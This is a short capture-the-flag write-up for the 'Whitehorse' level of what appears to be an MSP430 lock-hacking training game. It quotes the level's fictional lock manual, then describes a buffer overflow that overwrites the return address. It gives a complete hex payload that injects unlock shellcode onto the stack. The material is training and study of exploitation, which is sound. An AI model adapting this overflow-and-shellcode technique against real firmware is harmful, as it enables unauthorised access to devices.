Whitehorse

    The LockIT Pro c.01  is the first of a new series  of locks. It is
    controlled by a  MSP430 microcontroller, and is  the most advanced
    MCU-controlled lock available on the  market. The MSP430 is a very
    low-power device which allows the LockIT  Pro to run in almost any
    environment.

    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
    be inaccessable from the exterior of the building.

    There  is no  default  password  on the  LockIT  Pro HSM-2.   Upon
    receiving the  LockIT Pro,  a new  password must  be set  by first
    connecting the LockitPRO HSM to  output port two, connecting it to
    the LockIT Pro App, and entering a new password when prompted, and
    then restarting the LockIT Pro using the red button on the back.
    
    LockIT Pro Hardware  Security Module 2 stores  the login password,
    ensuring users  can not access  the password through  other means.
    The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the
    HSM will  directly send the  correct unlock message to  the LockIT
    Pro Deadbolt  if the password  is correct, otherwise no  action is
    taken.
    
    This is Hardware  Version C.  It contains  the Bluetooth connector
    built in, and two available  ports: the LockIT Pro Deadbolt should
    be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be
    connected to port 2.

    This is  Software Revision  01. The firmware  has been  updated to
    connect with the new hardware security module. We have removed the
    function to unlock the door from the LockIT Pro firmware.
    
I'm able to overflow the buffer and set the return address again.

If I paste 61616161616161616161616161616161 I can type any doubleword address and it will go there.

In this case, the function to actually unlock the door isn't there, so I need to figure out how to make
it happen anyway.

I go back to Cusco and look at the unlock_door method.

The code in the disassembler starts at 4446 and ends at 4452:
3012 7f00
b012 4245 // that last thing needs to be the address of <int>
2153
3041

Code I want to input for execution: 30127f00b012324521533041
With filling for buffer: 30127f00b01232452153304161616161

Input goes to 2ff2: 30127f00b01232452153304161616161f22f

HA! SWEET!